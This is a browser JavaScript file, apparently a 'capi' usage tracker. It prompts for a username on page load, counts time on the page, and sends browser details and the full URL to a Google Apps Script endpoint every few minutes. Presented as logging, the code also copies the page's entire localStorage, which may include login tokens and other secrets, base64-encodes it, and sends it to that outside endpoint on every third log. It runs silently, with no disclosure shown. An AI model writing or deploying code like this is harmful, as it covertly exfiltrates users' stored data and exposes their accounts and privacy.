// Function to generate UUID
function generateUUID() {
  return crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Function to log data to Google Apps Script
function logData(includeUpload = false) {
  const user = localStorage.getItem('capi_user') || 'anonymous';
  const uuid = localStorage.getItem('capi_uuid') || 'unknown';
  const time_sec = localStorage.getItem('capi_time_sec') || '0';
  const first_appeared = localStorage.getItem('capi_first_appeared') || 'unknown';
  const screenres = `${screen.width}x${screen.height}`;
  const user_agent = navigator.userAgent;
  const full_url = window.location.href;

  let url = `https://script.google.com/macros/s/AKfycbxhQiisy19Q9lxqPlDEuwGtoicw_AcXbfYeAoUKgskmDOmeWCNLUEabN6OXuxs-8oaF7Q/exec?` +
    `user=${encodeURIComponent(user)}` +
    `&uuid=${encodeURIComponent(uuid)}` +
    `&time_sec=${encodeURIComponent(time_sec)}` +
    `&first_appeared=${encodeURIComponent(first_appeared)}` +
    `&screenres=${encodeURIComponent(screenres)}` +
    `&user_agent=${encodeURIComponent(user_agent)}` +
    `&full_url=${encodeURIComponent(full_url)}`;

  if (includeUpload) {
    const storageObj = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      storageObj[key] = localStorage.getItem(key);
    }
    const prettyJson = JSON.stringify(storageObj, null, 2);
    const base64data = btoa(unescape(encodeURIComponent(prettyJson))); // Better UTF-8 handling
    url += `&upload=${encodeURIComponent(base64data)}`;
  }

  fetch(url, { method: 'GET', mode: 'no-cors' })
    .then(() => console.log('Log success'))
    .catch(error => console.error('Log error:', error));
}

// Function to prompt for username
function promptForUsername(callback) {
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background-color: rgba(0,0,0,0.5); display: flex; justify-content: center;
    align-items: center; z-index: 9999;
  `;

  const box = document.createElement('div');
  box.style.cssText = `
    background: white; padding: 20px; border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.2); text-align: center; width: 300px;
  `;

  const title = document.createElement('h2');
  title.textContent = 'Username:';
  title.style.marginBottom = '10px';

  const input = document.createElement('input');
  input.type = 'text';
  input.style.cssText = `
    width: 100%; padding: 10px; margin-bottom: 10px;
    border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;
  `;

  const button = document.createElement('button');
  button.textContent = '✓';
  button.style.cssText = `
    background: transparent; border: 2px solid green; color: green;
    font-size: 20px; padding: 5px 12px; border-radius: 50%; cursor: pointer;
  `;

  function submit() {
    const username = input.value.trim();
    if (username) {
      localStorage.setItem('capi_user', username);
      overlay.remove();
      callback();
    }
  }

  button.addEventListener('click', submit);
  input.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') submit();
  });

  box.appendChild(title);
  box.appendChild(input);
  box.appendChild(button);
  overlay.appendChild(box);
  document.body.appendChild(overlay);
  input.focus();
}

// Main initialization
function initCapi() {
  let needsPrompt = false;

  // Set up first appearance timestamp (only once ever)
  if (!localStorage.getItem('capi_first_appeared')) {
    localStorage.setItem('capi_first_appeared', new Date().toISOString());
  }

  // Set up UUID (only once per browser)
  if (!localStorage.getItem('capi_uuid')) {
    localStorage.setItem('capi_uuid', generateUUID());
  }

  // Initialize time counter if not exists
  if (!localStorage.getItem('capi_time_sec')) {
    localStorage.setItem('capi_time_sec', '0');
  }

  // Check if username is missing
  if (!localStorage.getItem('capi_user')) {
    needsPrompt = true;
  }

  // Initialize log count
  if (!localStorage.getItem('capi_log_count')) {
    localStorage.setItem('capi_log_count', '0');
  }

  function startTracking() {
    let logCount = parseInt(localStorage.getItem('capi_log_count'), 10);

    // Initial log on load
    logCount++;
    localStorage.setItem('capi_log_count', logCount.toString());
    logData(logCount % 3 === 0);

    // Increment time every second
    setInterval(() => {
      let time = parseInt(localStorage.getItem('capi_time_sec'), 10);
      time += 1;
      localStorage.setItem('capi_time_sec', time.toString());
    }, 1000);

    // Periodic log every ~5 minutes (315 seconds)
    setInterval(() => {
      logCount++;
      localStorage.setItem('capi_log_count', logCount.toString());
      logData(logCount % 3 === 0);
    }, 315000);
  }

  if (needsPrompt) {
    promptForUsername(startTracking);
  } else {
    startTracking();
  }
}

// Start when page loads
window.addEventListener('load', initCapi);